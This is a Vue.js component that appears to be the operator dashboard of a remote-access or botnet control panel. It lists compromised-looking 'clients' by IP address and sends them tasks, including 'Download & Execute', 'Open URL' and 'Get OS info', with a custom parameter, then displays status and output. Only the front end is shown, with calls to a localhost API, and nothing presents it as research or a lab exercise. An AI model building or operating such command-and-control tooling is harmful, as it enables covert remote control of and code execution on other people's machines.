<template>
  <v-container>
    <v-card>
      <v-card-title>Previous Tasks</v-card-title>
      <v-alert
        v-if="alertMessage"
        :type="alertType"
        dismissible
        @input="alertMessage = ''"
      >
        {{ alertMessage }}
      </v-alert>
      <v-card-text>
        <v-data-table :headers="headers" :items="tasks" class="elevation-1">
          <template v-slot:item.status="{ item }">
            <v-chip :color="getStatusColor(item.status)" dark>
              {{ item.status }}
            </v-chip>
          </template>
          <template v-slot:item.actions="{ item }">
            <v-btn icon @click="viewTaskOutput(item.id)">
              <v-icon>mdi-eye</v-icon>
            </v-btn>
            <v-btn icon @click="deleteTask(item.id)">
              <v-icon>mdi-delete</v-icon>
            </v-btn>
          </template>
        </v-data-table>
      </v-card-text>
    </v-card>
    <v-card class="mt-5">
      <v-card-title>Send New Task</v-card-title>
      <v-card-text>
        <v-form @submit.prevent="sendTask">
          <v-select
            v-model="selectedClient"
            :items="clients"
            item-text="address"
            item-value="address"
            label="Select Client"
            required
          ></v-select>
          <v-select
            v-model="newTask.task"
            :items="predefinedTasks"
            label="Select Task"
            required
          ></v-select>
          <v-text-field
            v-model="newTask.additionalText"
            label="Custom parameter"
          ></v-text-field>
          <v-btn type="submit" color="primary">Send</v-btn>
        </v-form>
      </v-card-text>
    </v-card>
    <!-- Dialog to display task output -->
    <v-dialog v-model="dialog" max-width="500">
      <v-card>
        <v-card-title>Task Output</v-card-title>
        <v-card-text>
          <v-textarea
            v-model="taskOutput"
            readonly
            rows="10"
            label="Output"
          ></v-textarea>
        </v-card-text>
        <v-card-actions>
          <v-btn color="primary" @click="dialog = false">Close</v-btn>
        </v-card-actions>
      </v-card>
    </v-dialog>
  </v-container>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from "vue";
import axios from "axios";

const headers = [
  { title: "ID", value: "id" },
  { title: "IP", value: "ip" },
  { title: "Task", value: "task" },
  { title: "Status", value: "status" },
  { title: "Actions", value: "actions", sortable: false },
];

const tasks = ref([]);
const clients = ref([]);
const selectedClient = ref(null);
const newTask = ref({ task: "", additionalText: "" });
const predefinedTasks = ref(["Open URL", "Download & Execute", "Get OS info"]);
const dialog = ref(false);
const taskOutput = ref("");
const alertMessage = ref("");
const alertType = ref("success");
let ws;

onMounted(() => {
  fetchTasks();
  fetchClients();
  setupWebSocket();
});

function setupWebSocket() {
  ws = new WebSocket("ws://localhost:80");
  ws.onmessage = (event) => {
    const updatedTask = JSON.parse(event.data);
    const index = tasks.value.findIndex((task) => task.id === updatedTask.id);
    if (index !== -1) {
      console.log("Updating task:", updatedTask);
      tasks.value[index].status = updatedTask.status;
      tasks.value[index].output = updatedTask.output;
    }
  };
  ws.onclose = (event) => {
    console.error("WebSocket closed:", event);
  };
  ws.onerror = (error) => {
    console.error("WebSocket error:", error);
  };
}

function fetchTasks() {
  axios
    .get("http://localhost:8000/api/v1/tasks")
    .then((response) => {
      tasks.value = response.data;
    })
    .catch((error) => {
      console.error("Error fetching tasks:", error);
      alertMessage.value = "Error fetching tasks: " + error.message;
      alertType.value = "error";
    });
}

function fetchClients() {
  axios
    .get("http://localhost:8000/api/v1/clients")
    .then((response) => {
      clients.value = response.data.map((client) => client.address);
    })
    .catch((error) => {
      console.error("Error fetching clients:", error);
      alertMessage.value = "Error fetching clients: " + error.message;
      alertType.value = "error";
    });
}

function getStatusColor(status) {
  switch (status) {
    case "Completed":
      return "green";
    case "Failed":
      return "red";
    case "Pending":
      return "orange";
    default:
      return "grey";
  }
}

function sendTask() {
  if (selectedClient.value && newTask.value.task) {
    const task = {
      ip: selectedClient.value,
      task: newTask.value.task,
      additionalText: newTask.value.additionalText,
      status: "Pending",
    };
    axios
      .post("http://localhost:8000/api/v1/tasks", task)
      .then(() => {
        fetchTasks();
        newTask.value.task = "";
        newTask.value.additionalText = "";
        selectedClient.value = null;
      })
      .catch((error) => {
        console.error("Error sending task:", error);
        alertMessage.value = "Error sending task: " + error.message;
        alertType.value = "error";
      });
  }
}

function deleteTask(id) {
  axios
    .delete(`http://localhost:8000/api/v1/tasks/${id}`)
    .then(() => {
      fetchTasks();
    })
    .catch((error) => {
      console.error("Error deleting task:", error);
      alertMessage.value = "Error deleting task: " + error.message;
      alertType.value = "error";
    });
}

function viewTaskOutput(id) {
  axios
    .get(`http://localhost:8000/api/v1/tasks/${id}`)
    .then((response) => {
      taskOutput.value = response.data.output || "No output available";
      dialog.value = true;
    })
    .catch((error) => {
      console.error("Error fetching task output:", error);
      alertMessage.value = "Error fetching task output: " + error.message;
      alertType.value = "error";
    });
}

onUnmounted(() => {
  if (ws) {
    ws.close();
  }
});
</script>

<style scoped>
.v-card {
  margin-top: 20px;
}
</style>
